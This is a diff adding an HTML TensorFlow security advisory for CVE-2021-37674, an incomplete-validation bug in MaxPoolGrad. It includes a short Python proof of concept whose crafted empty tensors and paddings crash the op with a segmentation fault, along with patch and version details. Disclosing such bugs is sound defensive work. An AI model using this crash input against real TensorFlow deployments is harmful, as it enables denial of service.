@@ -1,0 +1,36 @@
+<h2>TFSA-2021-148: Incomplete validation in <code>MaxPoolGrad</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-37674</p>
+<h3>Impact</h3>
+<p>An attacker can trigger a denial of service via a segmentation fault in
+<code>tf.raw_ops.MaxPoolGrad</code> caused by missing validation:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>tf.raw_ops.MaxPoolGrad(
+  orig_input = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),
+  orig_output = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),
+  grad = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),
+  ksize = [1, 16, 16, 1],
+  strides = [1, 16, 18, 1],
+  padding = "EXPLICIT",
+  explicit_paddings = [0, 0, 14, 3, 15, 5, 0, 0])
+```</p>
+<p>The
+<a href="https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/maxpooling_op.cc">implementation</a>
+misses some validation for the <code>orig_input</code> and <code>orig_output</code> tensors.</p>
+<p>The fixes for
+<a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-068.md">CVE-2021-29579</a>
+were incomplete.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/136b51f10903e044308cf77117c0ed9871350475">136b51f10903e044308cf77117c0ed9871350475</a>.</p>
+<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
+commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
+also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>
